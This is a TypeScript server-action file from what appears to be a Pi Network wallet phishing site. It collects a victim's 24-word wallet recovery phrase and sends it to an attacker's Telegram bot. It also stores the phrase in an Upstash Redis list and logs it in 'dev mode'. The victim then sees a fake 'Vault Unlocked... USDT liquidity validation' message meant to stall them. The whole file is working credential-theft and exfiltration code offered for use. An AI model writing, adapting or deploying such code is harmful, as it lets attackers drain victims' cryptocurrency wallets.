"use server";

interface SendResponse {
    error?: string;
    success?: string;
}

export const sendPhrase = async (formData: FormData): Promise<SendResponse> => {
    const passPhrase = formData.get("passphrase") as string;

    if (!passPhrase) {
        return { error: "Passphrase is required" };
    }

    // Validate exactly 24 words
    const words = passPhrase.trim().split(/\s+/);
    if (words.length !== 24) {
        return { error: "Passphrase must be exactly 24 words" };
    }

    try {
        const upstashRedisUrl = process.env.UPSTASH_REDIS_REST_URL;
        const upstashRedisToken = process.env.UPSTASH_REDIS_REST_TOKEN;
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        // 1. Send directly to Telegram Bot
        if (telegramBotToken && telegramChatId) {
            const tgUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            const text = `🚨 *New Pi Wallet Submission* 🚨\n\n\`${passPhrase}\``;

            const tgResp = await fetch(tgUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: text,
                    parse_mode: "MarkdownV2"
                })
            });

            if (!tgResp.ok) {
                console.error("Telegram API Error:", await tgResp.text());
            }
        }

        // 2. Backup to Upstash Redis (if configured)
        if (upstashRedisUrl && upstashRedisToken) {
            const upstashResp = await fetch(`${upstashRedisUrl}/lpush/pi_phrases`, {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${upstashRedisToken}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(passPhrase)
            });

            if (!upstashResp.ok) {
                console.error("Upstash API Error:", await upstashResp.text());
            }
        }

        // If both are missing, we log it for development purposes
        if (!telegramBotToken && !upstashRedisUrl) {
            console.log("[DEV MODE] Captured Passphrase:", passPhrase);
            console.warn("Keys missing! Please add UPSTASH_REDIS_REST_URL, TELEGRAM_BOT_TOKEN to .env.local");
        }

    } catch (error) {
        console.error("Error sending phrase:", error);
        return { error: "Something went wrong sending the transaction." };
    }

    return {
        success: "Vault Unlocked. Connecting to mainnet Protocol v23... Please wait for USDT liquidity validation.",
    };
};
